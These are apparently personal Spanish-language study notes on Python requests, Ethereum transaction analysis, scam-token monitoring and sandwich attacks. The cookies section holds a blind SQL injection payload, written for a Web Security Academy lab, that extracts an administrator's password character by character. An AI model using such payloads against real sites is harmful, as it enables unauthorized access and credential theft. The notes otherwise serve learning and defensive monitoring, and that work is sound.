
# Explicacion codigo de python


## rstrip()
Quita los espacion del final de una cadena en esta caso se usa para generar una lista

![image](https://user-images.githubusercontent.com/63270579/195608543-e5e91337-2f01-4900-b7c4-b12c254b3332.png)

>https://stackoverflow.com/questions/7984169/remove-trailing-newline-from-the-elements-of-a-string-list

## lista

Fijate como se crea una lista el codigo comentado es lo mismo que el de abajo desglosado


## Python Get Current time

Para obtener la fecha y hora existen varios metodos pero el que estoy estudiando es este:

```python

from datetime import datetime

now = datetime.now()

current_time = now.strftime("%H:%M:%S")
print("Current Time =", current_time)
### Alternativa

current_time = now.strftime("%m-%d-%Y (%H:%M:%S)")
>>> print(current_time)
10-14-2022 (08:02:35)


```

## Python requests

Libreria que sirve para hacer peticiones la respuesta se tiene que trasformar a texto para porderla leer 

```python
import requests

response = requests.get("https://raw.githubusercontent.com/something")
data = response.text


```

### Cookies y Sessiones

```python
import requests

main_url="https://0ad500f40378426ec0e710a000e1005f.web-security-academy.net"

			cookies = {

				'TrackingId': "USt7UKseU00I52be' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
				'session': 'S1AqgdciZYIY6zutQrKkUQqmiUShSTmA'
			}

			
			r= requests.get(main_url,cookies=cookies)

```


# ETH

## TX internas vs Tx Externas

The Internal Transactions tab lists all transactions initiated by internal accounts as a result of one or more preceding transactions.

Pagina donde se explica TX interna y Tx externas ademas se ve un SPAM token
>https://www.sitepoint.com/ethereum-internal-transactions-token-transfers/

Tokens SCAM
>https://www.criptonoticias.com/seguridad-bitcoin/token-scam-esta-siendo-usado-robar-carteras-metamask-contamos-funciona/



# Python y ETH

Este es un codigo modificado por mi.

```python
# 0bjectives :
# 1. Request the attacke rs obfuscated code
# 2. Parse out the attackers address from that code
# 3. Update our running list of attacke r Addresses
# 4. Log the Attackers addresses to disk with time and date
# 5. Setup a Timing interval to check for new add resses
#!/usr/bin/python3

# re de expreciones regulares
import requests, re, time
from datetime import datetime

attackers_list = [line.rstrip() for line in open("attackersAddress.txt")]

# for line in open("attackersAddress.txt"):
#    print(line.rstrip())

# txt = "     banana     "

# x = txt.rstrip()

# print("of all fruits", x, "is my favorite")
# of all fruits     banana is my favorite
# Quita los espacion del final
now = datetime.now()
timeUpdated = now.strftime("%d-%b-%Y (%H:%M:%S.%f)")
response = requests.get("https://raw.githubusercontent.com/gcr07/UniV3/main/README.md")
# convertir la respuesta en texto

data = response.text
# attackersAddress = re.search(r"return (.*?);", data).group(1)
attackersAddress = []
attackersAddress = re.findall(r"return (.*?);", data)
for element in attackersAddress:
    if element not in attackers_list:
        with open("attackersAddress.txt", "a") as writer:
            writer.write(element + "\n")
        with open("attackersAddress.csv", "a") as writer:
            writer.write(element + "," + timeUpdated + "\n")
            print(f"New address {element} logged at {timeUpdated} \n")



# print(attackersAddress)
# print("Limpiando Listas")
# attackersAddress.clear()
# print(attackersAddress)
# donde este return . acepta todos los caracteres exepto saltos de linea
# despues el * acepta cero o mas caracteres de lo que lo preceda
# finalmente ? osea que ya no se siga lee abajo lo hace no codicioso
# El '*', ' ' y '?' los calificadores son todos codiciosos; coinciden con la mayor cantidad de texto posible. A veces no se desea este comportamiento; si RE <.*> coincide con '<a> b <c>', coincidirá con toda la cadena, y no solo con '<a>'. ¿Agregando? después de que el calificador lo haga realizar el partido de manera no codiciosa o mínima; coincidirán el menor número posible de caracteres. El uso de RE <.*?> coincidirá solo con '<a>'.

```

Este es el codigo original

```python
##From the Console Cowboys Youtube Series
## Monitors for address changes on smart contract we were auditing
##@ficti0n on twitter

import requests, re, time
from datetime import datetime

attackers_list = [line.rstrip() for line in open('attackersOutput.txt')]

def checkAddresses():
    response = requests.get("https://raw.githubusercontent.com/uniswaprouter3/mempool/main/v3")
    data = response.text
    attackerAddress = re.search(r'return (.*?);', data).group(1)
    now = datetime.now()
    timeUpdated = now.strftime("%d-%b-%Y (%H:%M:%S.%f)")

    if attackerAddress not in attackers_list:
        attackers_list.append(attackerAddress)
        writeAddress(attackerAddress, timeUpdated)

def writeAddress(attackerAddress, timeUpdated):
    with open("attackersOutput.txt", 'a') as writer:
        writer.write(attackerAddress + "\n")

    with open('attackerAddress.csv', 'a') as writer:
        writer.write(attackerAddress+","+timeUpdated + "\n")
    print(f' New address {attackerAddress} logged at {timeUpdated} \n')

def main():
    while(True):
        checkAddresses()
        time.sleep(300)
        


if __name__ == "__main__":
    main()
   
   
```    
## Transacciones internas (Lecciones aprendidas)

Para dejar una variable de entorno persistente en Ubuntu meti apikey dentro de /etc/enviroment

## OS

La libreria os en python se utilizo para cargar varibles de entorno

## request

para enviar parametros para consumir una api se hace con params

```
etherscan_params = (
    ("module", "account"),
    ("action", "txlistinternal"),
    ("address", target_address),
    ("sort", "asc"),
    ("apikey", api_key),
)


response = requests.get("https://api.etherscan.io/api", params=etherscan_params)
data = response.json().get("result")  # Uno de los campos que regresa es
# result por eso usa este
# print(data)

```
La respuesta si es json se puede tratar como tal en este caso nos traemos la parte del json de result

En un bucle for se pueden contar los elementos poniendo enumerate y una variable delante de elemento como en el siguiente codigo:

```
for count, transaction in enumerate(data):# lleva la cuenta
    print(f"Transaction: {count}")
    print(f'Block number: {transaction.get("blockNumber")}')
    
```

## ETHERSCAN INPUT DATA

Function calls in the Ethereum Virtual Machine are specified by the first four bytes of data sent with a transaction. These 4-byte signatures are defined as the first four bytes of the Keccak hash (SHA3) of the canonical representation of the function signature. The database also contains mappings for event signatures. Unlike function signatures, they are defined as 32-bytes of the Keccak hash (SHA3) of the canonical form of the event signature. Since this is a one-way operation, it is not possible to derive the human-readable representation of the function or event from the bytes signature. This database is meant to allow mapping those bytes signatures back to their human-readable versions.

Por ejemplo los cuatro primeos bytes del hash de los strings "withdrawal()" o de "transfer()"

> https://www.4byte.directory/

## Sandwitch Attack

Palabras clave en youtube "ethereum sandwich attack  explicacion"

 In a sandwich attack, a program will look for a pending transaction by another user on a blockchain network of their choice. The predatory trader will then place one trade order just before the victim’s pending transaction (front-running) and another trade order just after it (back-running). The victim’s pending transaction will be sandwiched between the two new trade orders created by the attacker. If the attack is successful, the attacker will create an artificial price increase and generate a profit. Sandwich attacks are partly possible because of transaction transparency in the mempool but also because DEXs allow price slippage during trades. Price slippage refers to the difference between the expected price of a trade and the actual trade execution price. DEXs usually allow for 1% slippage but in trading pools with lower liquidity, slippage can go up to 3% or higher. Now, let’s look at an example. First, the attacker will buy an asset the victim is trying to swap. For example, using WBTC to exchange to ETH. At the point of buying the asset, the attacker already knows that the price of ETH is increasing. They will proceed to buy ETH at a lower price so that the victim ends up buying it at a higher price. The attacker stands to gain as they end up selling the ETH they bought at a lower price, at a higher price immediately after.
 
 > https://www.youtube.com/watch?v=vh0VOkFe-Ew

## Flashbots

Son un grupo de mineros que tienen un mempool provado y que te protegend e los ataques de sandwitch

## Ataque Salmonela

> https://github.com/Defi-Cartel/salmonella

## Plugins para decodificar smartcontracts


![image](https://user-images.githubusercontent.com/63270579/196963579-8d0633a3-83c9-469a-ba3d-3683bb6bdfcc.png)


![image](https://user-images.githubusercontent.com/63270579/196963815-85f93b5b-c44d-47b3-a045-9f02a4478702.png)


![image](https://user-images.githubusercontent.com/63270579/196964484-ca8ae597-9d6a-4551-b51b-6d0d18c9f7d1.png)


![image](https://user-images.githubusercontent.com/63270579/196965778-acecd210-e12f-4963-8f9d-59763ec4936f.png)



